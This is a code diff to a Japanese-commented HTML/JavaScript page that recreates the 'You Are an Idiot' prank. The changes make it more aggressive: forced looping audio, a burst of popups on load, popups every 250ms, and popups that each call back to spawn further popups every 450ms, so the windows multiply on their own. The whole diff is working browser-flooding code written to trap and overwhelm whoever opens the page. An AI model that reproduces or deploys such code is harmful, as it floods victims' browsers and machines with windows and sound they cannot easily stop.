@@ -32,7 +32,7 @@
     <h1>YOU ARE AN IDIOT</h1>
     <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
          class="idiot-img" alt="You are an idiot">
-    <p>何もしないで勝手に増えて音が鳴り続けるよ...</p>
+    <p>めっちゃ速く勝手に増えるよ...<br>押したらもっとヤバくなる</p>
 
     <audio id="idiotSound" preload="auto" loop></audio>
 
@@ -44,16 +44,14 @@
         function forcePlay(audio) {
             if (!audio) return;
             audio.currentTime = 0;
-            audio.play().catch(() => {
-                setTimeout(() => forcePlay(audio), 30);   // 超高速リトライ
-            });
+            audio.play().catch(() => setTimeout(() => forcePlay(audio), 30));
         }
 
         function spawnPopup() {
             const width = 480;
             const height = 440;
-            const left = Math.random() * (screen.availWidth - width - 120) + 60;
-            const top = Math.random() * (screen.availHeight - height - 120) + 60;
+            const left = Math.random() * (screen.availWidth - width - 100) + 50;
+            const top = Math.random() * (screen.availHeight - height - 100) + 50;
 
             const popup = window.open('', '_blank', 
                 `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
@@ -76,7 +74,7 @@
                     <body>
                         <h1>YOU ARE AN IDIOT</h1>
                         <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
-                        <p>勝手に音が鳴ってる...</p>
+                        <p>勝手に増えてる...</p>
                         <audio id="sound" preload="auto" loop></audio>
                         <script>
                             const s = document.getElementById('sound');
@@ -91,11 +89,13 @@
                                 forcePlay();
                                 setTimeout(forcePlay, 20);
                                 setTimeout(forcePlay, 50);
-                                setTimeout(forcePlay, 90);
 
+                                // ポップアップ内でも勝手に増やす（これが「勝手に動く」部分）
                                 setInterval(() => {
-                                    if (s.paused || s.ended) forcePlay();
-                                }, 30);
+                                    if (window.opener && typeof window.opener.spawnPopup === 'function') {
+                                        window.opener.spawnPopup();
+                                    }
+                                }, 450);   // ポップアップ自身も0.45秒ごとに新しいのを呼ぶ
                             };
                         <\/script>
                     </body>
@@ -106,32 +106,35 @@
             }
         }
 
+        // ====================== メイン画面 ======================
         window.onload = () => {
             function mainForcePlay() {
                 sound.currentTime = 0;
                 sound.play().catch(() => setTimeout(mainForcePlay, 30));
             }
 
-            // ページを開いた瞬間に全力で音を鳴らす
+            // 音を全力で自動再生
             mainForcePlay();
             setTimeout(mainForcePlay, 10);
             setTimeout(mainForcePlay, 30);
             setTimeout(mainForcePlay, 70);
-            setTimeout(mainForcePlay, 110);
 
-            // ポップアップも即連発
-            setTimeout(() => spawnPopup(), 180);
-            setTimeout(() => spawnPopup(), 350);
-            setTimeout(() => spawnPopup(), 550);
-            setTimeout(() => spawnPopup(), 780);
-            setTimeout(() => spawnPopup(), 1020);
+            // 開いた瞬間にめっちゃ速くポップアップを連発
+            setTimeout(() => spawnPopup(), 150);
+            setTimeout(() => spawnPopup(), 220);
+            setTimeout(() => spawnPopup(), 290);
+            setTimeout(() => spawnPopup(), 360);
+            setTimeout(() => spawnPopup(), 430);
+            setTimeout(() => spawnPopup(), 500);
 
-            // 自動増殖（これがすでに動いてる部分）
+            // 自動増殖（超速！ 250msごとに1個）
             setTimeout(() => {
-                setInterval(spawnPopup, 620);
-            }, 1300);
+                setInterval(() => {
+                    spawnPopup();
+                }, 250);
+            }, 600);
 
-            // 音が止まったら即復活（最強保険）
+            // 最終保険
             setInterval(() => {
                 if (sound.paused) mainForcePlay();
             }, 30);
